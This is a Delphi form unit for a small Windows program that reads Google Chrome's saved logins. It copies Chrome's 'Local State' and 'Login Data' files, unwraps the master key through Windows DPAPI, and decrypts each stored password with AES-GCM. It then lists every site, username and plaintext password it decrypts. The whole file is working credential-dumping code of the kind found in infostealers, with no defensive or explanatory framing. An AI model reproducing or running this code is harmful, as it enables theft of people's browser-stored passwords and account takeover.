unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics, Vcl.Controls, Vcl.Forms, netencoding,
  Vcl.Dialogs, Vcl.StdCtrls,
  FireDAC.UI.Intf, FireDAC.VCLUI.Wait, FireDAC.Stan.Intf, FireDAC.Stan.Option,
  FireDAC.Stan.Param, FireDAC.Stan.Error, FireDAC.DatS, FireDAC.Phys.Intf,
  FireDAC.DApt.Intf, FireDAC.Stan.Async, FireDAC.DApt, FireDAC.Stan.Def,
  FireDAC.Stan.Pool, FireDAC.Phys, Vcl.ComCtrls, Data.DB, FireDAC.Comp.Client,
  FireDAC.Comp.DataSet, FireDAC.Comp.UI, FireDAC.Phys.SQLite, StrUtils, Winapi.Security.Cryptography,
  System.ImageList, Vcl.ImgList,
  System.JSON, AESObj, CryptBase;


type
  TForm1 = class(TForm)
    FDGUIxWaitCursor: TFDGUIxWaitCursor;
    FDQuery: TFDQuery;
    FDConnection: TFDConnection;
    AESGCM1: TAESGCM;
    ListView1: TListView;
    Button1: TButton;
    procedure FormResize(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    Original_Login_Data, New_Login_Data: String;
    Original_Local_State, New_Local_State: String;
    username: string;
  end;

var
  Form1: TForm1;

implementation

type
  DATA_BLOB = record
    cbData: DWORD;
    pbData: PBYTE;
  end;

function CryptUnprotectData(pDataIn: PDATA_BLOB; ppszDataDescr: PPWideChar;
  pOptionalEntropy: PDATA_BLOB; pvReserved: Pointer; pPromptStruct: Pointer;
  dwFlags: DWORD; pDataOut: PDATA_BLOB): BOOL; stdcall; external 'Crypt32.dll';

{$R *.dfm}
function dpApiUnprotectData(fpDataIn: TBytes): TBytes;
var
  DataIn, DataOut: DATA_BLOB;
begin
  DataOut.cbData := 0;
  DataOut.pbData := nil;

  DataIn.cbData := Length(fpDataIn);
  DataIn.pbData := @fpDataIn[0];

  if not CryptUnprotectData(@DataIn, nil, nil, nil, nil, 0, @DataOut) then
    RaiseLastOSError;

  SetLength(Result, DataOut.cbData);
  Move(DataOut.pbData^, Result[0], DataOut.cbData);
  LocalFree(HLOCAL(DataOut.pbData));
end;

function GetLoggedInUsername: string;
var
  UserName: array[0..255] of Char;
  UserNameSize: DWORD;
begin
  UserNameSize := SizeOf(UserName);
  if GetUserName(UserName, UserNameSize) then
    Result := UserName
  else
    Result := '';
end;

procedure TForm1.Button1Click(Sender: TObject);
var
  Original_Login_Data, New_Login_Data: String;
  Original_Local_State, New_Local_State: String;
  username: string;
  Encrypted_Key: string;
  keybytes: TBytes;
  KEY: TBytes;
  password: TBytes;
  ivbytes: TBytes;
  outpass: string;
  LI: TListItem;
  DBURL: string;
  DBUSERNAME: string;
  LocalStateJSON: TStringList;
  JSONObject: TJSONObject;
begin
  self.ListView1.Clear;
  username := GetLoggedInUsername;

  Original_Local_State := 'C:\Users\' + username +
    '\AppData\Local\Google\Chrome\User Data\Local State';
  New_Local_State := 'C:\Users\' + username +
    '\AppData\Local\Temp\Local State.json';

  if FileExists(New_Local_State) then
    DeleteFile(PChar(New_Local_State));
  CopyFile(PChar(Original_Local_State), PChar(New_Local_State), true);

  Original_Login_Data := 'C:\Users\' + username +
    '\AppData\Local\Google\Chrome\User Data\Default\Login Data';
  New_Login_Data := 'C:\Users\' + username +
    '\AppData\Local\Temp\Login Data.db';

  if FileExists(New_Login_Data) then
    DeleteFile(PChar(New_Login_Data));
  CopyFile(PChar(Original_Login_Data), PChar(New_Login_Data), true);

  LocalStateJSON := TStringList.Create;
  try
    LocalStateJSON.LoadFromFile(New_Local_State);
    JSONObject := TJSONObject.ParseJSONValue(LocalStateJSON.Text) as TJSONObject;
    try
      Encrypted_Key := JSONObject.GetValue<string>('os_crypt.encrypted_key');
      Encrypted_Key := StringReplace(Encrypted_Key, '"', '', [rfReplaceAll, rfIgnoreCase]);
    finally
      JSONObject.Free;
    end;
  finally
    LocalStateJSON.Free;
  end;

  keybytes := TNetEncoding.Base64.DecodeStringToBytes(Encrypted_Key);
  Delete(keybytes, 0, 5);
  KEY := dpApiUnprotectData(keybytes);

  Form1.FDConnection.Params.Clear;
  Form1.FDConnection.Params.DriverID := 'SQLite';
  Form1.FDConnection.Params.Database := New_Login_Data;
  Form1.FDQuery.SQL.Clear;
  Form1.FDQuery.SQL.Text := 'SELECT origin_url, action_url, username_value, password_value, date_created FROM logins';
  Form1.FDQuery.Open();

  while not Form1.FDQuery.Eof do
  begin
    DBUSERNAME := '';
    DBURL := '';
    password := nil;

    password := Form1.FDQuery.FieldByName('password_value').AsBytes;
    DBURL := Form1.FDQuery.FieldByName('origin_url').AsString;
    DBUSERNAME := Form1.FDQuery.FieldByName('username_value').AsString;

    Delete(password, 0, 3);
    ivbytes := Copy(password, 0, 12);
    Delete(password, 0, 12);

    self.AESGCM1.IVLength := 12;
    self.AESGCM1.IV := TEncoding.ANSI.GetString(ivbytes);
    self.AESGCM1.KEY := TEncoding.ANSI.GetString(KEY);
    try
      self.AESGCM1.DecryptAndVerify(TEncoding.UTF7.GetString(password), '', outpass);
      LI := self.ListView1.Items.Add;
      LI.Caption := DBURL;
      LI.SubItems.Add(DBUSERNAME);
      LI.SubItems.Add(outpass);
      LI.ImageIndex := 0;
      self.FDQuery.Next;
    except
      on E: Exception do
        self.FDQuery.Next;
    end;
  end;
end;

procedure TForm1.FormResize(Sender: TObject);
begin
  Form1.ListView1.Repaint;
end;

end.
